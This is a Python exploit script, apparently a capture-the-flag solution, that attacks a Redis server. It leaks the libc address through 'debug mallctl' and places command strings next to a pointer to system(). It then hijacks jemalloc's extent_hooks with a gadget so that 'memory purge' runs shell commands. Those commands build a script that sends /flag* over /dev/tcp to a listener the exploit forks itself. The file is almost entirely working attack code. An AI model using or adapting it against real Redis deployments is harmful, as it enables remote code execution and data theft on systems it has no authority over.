#!/usr/bin/env python3

import socket
import ctypes, struct
import os, time

class FakeRemote:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
    
    def send(self, data):
        if isinstance(data, str):
            data = data.encode('ascii')
        self.s.send(data)

    def recv(self, length):
        data = b''
        while len(data) < length:
            recv = self.s.recv(length - len(data))
            if not recv:
                raise EOFError
            data += recv
        return data

    def recvall(self):
        data = b''
        while True:
            recv = self.s.recv(0x1000)
            if not recv:
                break
            data += recv
        return data
    
    def recvuntil(self, until, drop=False):
        data = b''
        while not data.endswith(until):
            recv = self.s.recv(1)
            if not recv:
                raise EOFError
            data += recv
        return data[:-len(until)] if drop else data

    def info(self, s):
        print(f'[*] {s}')
    
    def success(self, s):
        print(f'[+] {s}')
    
    def close(self):
        self.s.close()

def query(qs):
    def _query(q):
        if isinstance(q, str):
            q = q.encode('ascii')
        
        if isinstance(q, (list, tuple)):
            p.send(f'*{len(q)}\r\n'.encode('ascii'))
            for qe in q:
                _query(qe)
        else:
            assert isinstance(q, (bytes, bytearray))
            p.send(f'${len(q)}\r\n'.encode('ascii') + q + b'\r\n')
    
    def _resp():
        first = p.recv(1)
        if first == b'+':
            return p.recvuntil(b'\r\n', drop=True)
        elif first == b'-':
            err = p.recvuntil(b'\r\n', drop=True)
            raise RuntimeError(f'Redis returned Error: {err}')
        elif first == b':':
            return int(p.recvuntil(b'\r\n', drop=True))
        elif first == b'$':
            length = int(p.recvuntil(b'\r\n', drop=True))
            data = p.recv(length)
            assert p.recv(2) == b'\r\n'
            return data
        else:
            assert first == b'*'
            length = int(p.recvuntil(b'\r\n', drop=True))
            return [_resp() for _ in range(length)]
    
    if isinstance(qs, str):
        qs = qs.encode('ascii')
    
    if isinstance(qs, (bytes, bytearray)):
        p.send(qs + b'\r\n')
    else:
        _query(qs)
    
    return _resp()

def query_addr(obj):
    return int(query(f'''debug object {obj}''').split()[1][3:], 16)

def p64(v, endian='little'):
    return struct.pack('<Q' if endian=='little' else '>Q', v)

def u64(v, endian='little'):
    return struct.unpack('<Q' if endian=='little' else '>Q', v)[0]

LHOST, LPORT = 'pieces', 9999
HOST, PORT = 'mirai', 65403

if os.fork() == 0:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', LPORT))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        data = conn.recv(0x1000)
        if not data:
            break
        print(data)
    exit()

time.sleep(0.5)

bash_cmd = f'cat /flag* > /dev/tcp/{LHOST}/{LPORT}'
cmds = [
#   '0123456789abcdef0123456789ab'
    "echo '#!/bin/bash'>/data/a",
] + [
    f"echo -n '{bash_cmd[st:st+9]}'>>/data/a" for st in range(0, len(bash_cmd), 9)
] + [
    "chmod 777 /da*/a",
    "/da*/a"
]
assert all(len(cmd) <= 0x1c for cmd in cmds)
cmds = [cmd.ljust(0x1c, '\0') for cmd in cmds]

p = FakeRemote(HOST, PORT)

assert query('''config set save ""''') == b'OK'
assert query('''debug mallctl background_thread 0''') in (0, 1)  # 1: first run, 0: following runs
for i in range(len(cmds)):
    assert query(f'''setbit K{i} 400000 0''') == 0

# can be replaced with "set I0 0" => "debug object I0"
libc_base = query('''debug mallctl thread.allocatedp''') + 0x38c0
assert libc_base & 0xfff == 0
libssl_base = libc_base + 0x4cd000

# for each cmds, try 0x100 times to get adjacent embstr
cmd_addrs = []
for i in range(len(cmds)):
    for j in range(0x100):
        assert query(['set', f'cmd{i}_{j}', cmds[i]]) == b'OK'
        assert query(['set', f'sys{i}_{j}',
            p64(libc_base + 0x449c0).ljust(0x1c)
        ]) # system@libc offset
        cmd_addr, sys_addr = query_addr(f'cmd{i}_{j}'), query_addr(f'sys{i}_{j}')
        if sys_addr == cmd_addr + 0x30:
            break
    else:
        assert False
    cmd_addrs.append(cmd_addr)

# 0x0000000000035ae0 : mov rdi, qword ptr [rdi] ; jmp qword ptr [rdi + 0x30]
for i in range(len(cmds)):
    cmd, cmd_addr = cmds[i], cmd_addrs[i]

    assert query(['set', 'extent_hook',
        p64(cmd_addr+0x13)+p64(libssl_base+0x35ae0)
    ]) == b'OK'
    extent_hook_addr = query_addr('extent_hook')

    original_extent_hook = query(f'''debug mallctl arena.0.extent_hooks {extent_hook_addr+0x13}''')
    assert query(f'''del K{i}''') == 1
    assert query('''memory purge''') == b'OK'  # command executed!

    # cleanup :)
    assert query(f'''debug mallctl arena.0.extent_hooks {original_extent_hook}''') == extent_hook_addr+0x13

assert query('flushall sync') == b'OK'
assert query('memory purge') == b'OK'

p.close()
